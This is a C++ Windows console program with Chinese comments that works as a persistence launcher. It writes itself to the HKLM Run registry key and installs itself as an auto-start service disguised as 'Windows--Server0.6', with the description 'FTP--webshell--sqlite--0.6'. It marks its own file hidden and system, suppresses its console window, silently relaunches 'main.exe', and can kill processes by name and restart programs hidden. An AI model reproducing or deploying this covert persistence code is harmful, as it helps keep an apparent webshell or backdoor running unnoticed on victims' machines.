// close_open.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "close_open.h"
#include<windows.h>
#include <Wininet.h>
#include <TLHELP32.H>
//#include <afx.h>
#include <afxtempl.h>
#include <vector>
using namespace std;
#include <iostream>   

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// The one and only application object

CWinApp theApp;

using namespace std;

int close_exe(CString strProcessName)
{
		BOOL bResult;
	CString strTemp;
	HANDLE hSnapshot;				//内存进程的“快照”句柄   
	PROCESSENTRY32 ProcessEntry;	//描述进程的结构   这个结构需要#include <TLHELP32.H>头文件
	vector<DWORD> vtPID;			//进程ID容器
	//输入要结束的进程名称
//strProcessName="main.exe";
//GetDlgItem(IDC_EDIT1)->GetWindowText(strProcessName);//获取文本框输入的进程名
	
//MessageBox(strProcessName);
	strProcessName.MakeLower();
	//返回内存所有进程的快照。参数为TH32CS_SNAPPROCESS取有的进程,忽略参数2；
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	//获取要结束的进程名称对应的所有进程ID
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
	bResult = Process32First(hSnapshot,&ProcessEntry);//获取第一个进程
	while(bResult)
	{
		//判断是否为要结束的进程
		strTemp.Format("%s",ProcessEntry.szExeFile);
		strTemp.MakeLower();
		//		MessageBox(strTemp);
		if(strTemp==strProcessName)
			vtPID.push_back(ProcessEntry.th32ProcessID);
		//获取下一个进程
		bResult = Process32Next(hSnapshot,&ProcessEntry);
	}
	//结束进程
	bResult = FALSE;
	vector<DWORD>::iterator it = vtPID.begin();
	for(;it!=vtPID.end();++it)
	{
		if(*it)
		{
			//获取进程句柄
			HANDLE hProcess;
			hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,*it);
			//结束进程
			if(hProcess)
				bResult = TerminateProcess(hProcess,0);
			if(!bResult)
				break;
		}
	}
	
	//
	if(bResult)
		return 1;  //结束成功
	else
		return 0;  //结束失败
}


#include "winsvc.h"
void AddServices(char *m_ServiceName, char *m_DisplayName, char *m_Description)   //添加服务
{    //AddServices("服务名" ,"服务描述", "服务描述");  
	char FilePath[MAX_PATH];
//	char SystemPath[MAX_PATH];
	GetModuleFileName(NULL,FilePath,MAX_PATH);   //GetModuleFileName取得应用所在路径
//	GetSystemDirectory(SystemPath,MAX_PATH);   //取得System目录完整路径名 
// 	if (strncmp(SystemPath,FilePath,strlen(SystemPath)) != 0)
// 	{
// 		char FileTitle[80];
// 		GetFileTitle(FilePath,FileTitle,80);
// 		if (strstr(FileTitle,".exe") == NULL && strstr(FileTitle,".EXE") == NULL)
// 			strcat(FileTitle,".exe");
// 		strcat(SystemPath,"\\");
// 		strcat(SystemPath,FileTitle);
// 		CopyFile(FilePath,SystemPath,FALSE);
// 		memset(FilePath,0,MAX_PATH);
// 		strcpy(FilePath,SystemPath);   //strcpy复制字符串
// 	}
	SetFileAttributes (FilePath,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);  //设置文件属性
	
    SC_HANDLE manager=NULL;
    SC_HANDLE service=NULL;
	char Desc[MAX_PATH];
	HKEY key=NULL;
    manager = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);  //SC_MANAGER_ALL_ACCESS 所有权限
    service=CreateService( manager,m_ServiceName,m_DisplayName,    //服务控制
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, 
		SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, 
		FilePath, 0, 0, 0, 0, 0 );
	
	strcpy(Desc,"SYSTEM\\CurrentControlSet\\Services\\");   //系统服务位置
	strcat(Desc,m_ServiceName);    //合并字符串
	RegOpenKey(HKEY_LOCAL_MACHINE,Desc,&key);  //打开注册表项
	RegSetValueEx(key,"Description",0,REG_SZ,(CONST BYTE*)m_Description,lstrlen(m_Description));   //添加服务描述
	
	StartService(service,0,NULL);	//启动服务
	RegCloseKey(key);     //关闭注册表句柄
    CloseServiceHandle(service);
    CloseServiceHandle(manager);
	return; 
}

BOOL BOOL_exe(CString strProcessName)  //判断进程是否存在
{
	BOOL bResult;
	CString strTemp;
	HANDLE hSnapshot;				//内存进程的“快照”句柄   
	PROCESSENTRY32 ProcessEntry;	//描述进程的结构   这个结构需要#include <TLHELP32.H>头文件
	vector<DWORD> vtPID;			//进程ID容器
	//输入要结束的进程名称
//strProcessName="main.exe";
//GetDlgItem(IDC_EDIT1)->GetWindowText(strProcessName);//获取文本框输入的进程名
	
//MessageBox(strProcessName);
	strProcessName.MakeLower();
	//返回内存所有进程的快照。参数为TH32CS_SNAPPROCESS取有的进程,忽略参数2；
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	//获取要结束的进程名称对应的所有进程ID
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
	bResult = Process32First(hSnapshot,&ProcessEntry);//获取第一个进程
	while(bResult)
	{
		//判断是否为要结束的进程
		strTemp.Format("%s",ProcessEntry.szExeFile);
		strTemp.MakeLower();
		//MessageBox(strTemp);
		
		if(strTemp==strProcessName){
			vtPID.push_back(ProcessEntry.th32ProcessID);
			   //进程存在
			return true;
		}
		//获取下一个进程
		bResult = Process32Next(hSnapshot,&ProcessEntry);
	}
	return false;  //进程不存在

}

void RegMe(void)  //注册表启动
{
 	char FilePath[MAX_PATH];
 	GetModuleFileName(NULL,FilePath,MAX_PATH);   //GetModuleFileName取得应用所在路径
	CString	lpValue;  //内容
	lpValue.Format("%s",FilePath);
	HKEY hkey=HKEY_LOCAL_MACHINE;   //主键
	char lpSubKey[256]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";   //子键
	HKEY phkResult;
     
    int len=sizeof(lpValue);  //名称
	
	if(::RegOpenKeyEx(hkey,lpSubKey,0,KEY_ALL_ACCESS,&phkResult)!=ERROR_SUCCESS)  //判断是否打开
	{
		::RegCreateKeyEx(hkey,lpSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_SET_VALUE|KEY_CREATE_SUB_KEY|KEY_WRITE,NULL,&phkResult,NULL);  //继续打开  应为上边没有打开成功
	}
	//如果不存在值，就新建
	if (RegQueryValueEx(hkey,lpSubKey,NULL,NULL,(unsigned char *)&lpValue,(unsigned long *)&len)!=ERROR_SUCCESS)   //判断键值是否存在
	::RegSetValueEx(phkResult,"FTP--webshell--sqlite--0.6",0,REG_SZ,(BYTE*)lpValue.GetBuffer(0),lpValue.GetLength());  //写入注册表内容
	::RegCloseKey(phkResult);  //释放指定注册键的句柄  
}

#pragma   comment(linker,   "/subsystem:\"windows\"   /entry:\"mainCRTStartup\""   )
//你要写控制台程序就用这个.在控制台程序中隐藏控制台窗口!

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	RegMe();  //注册表启动
	AddServices("ftp--Server0.6" ,"Windows--Server0.6", "FTP--webshell--sqlite--0.6");  
	if(argv[1]==NULL)
	{
		if (BOOL_exe("main.exe"))    //判断进程是否存在
		{
			//MessageBox("进程存在","1111",MB_OK);
			RegMe();  //注册表启动
			AddServices("ftp--Server0.6" ,"Windows--Server0.6", "FTP--webshell--sqlite--0.6");  
		} 
		else
		{
			ShellExecute(NULL,"open","main.exe",NULL,NULL,SW_HIDE);
			//MessageBox("进程不存在","1111",MB_OK);
		}
		

	}
	if(argv[1]!=NULL)
	{
		CString   str;   
		str.Format("开始结束进程：%s\n",argv[1]);
		printf (str);
		if(close_exe(argv[1]))
		{
			printf ("结束进程成功等待10秒从新启动程序！\n");
			_sleep(10*1000); //延时5秒 
			//MessageBox(NULL,"text","结束进程成功！",MB_OK);
			//_sleep(60*1000); //延时60秒 
			if(argv[2]!=NULL)
				ShellExecute( 0,"open",argv[2],NULL,NULL,SW_HIDE);
				//ShellExecute( 0,"open",argv[2],NULL,NULL,SW_SHOWMAXIMIZED);
		}
		else
			//MessageBox(NULL,"text","结束进程失败！",MB_OK);
			printf ("结束进程失败！\n");
	}
}


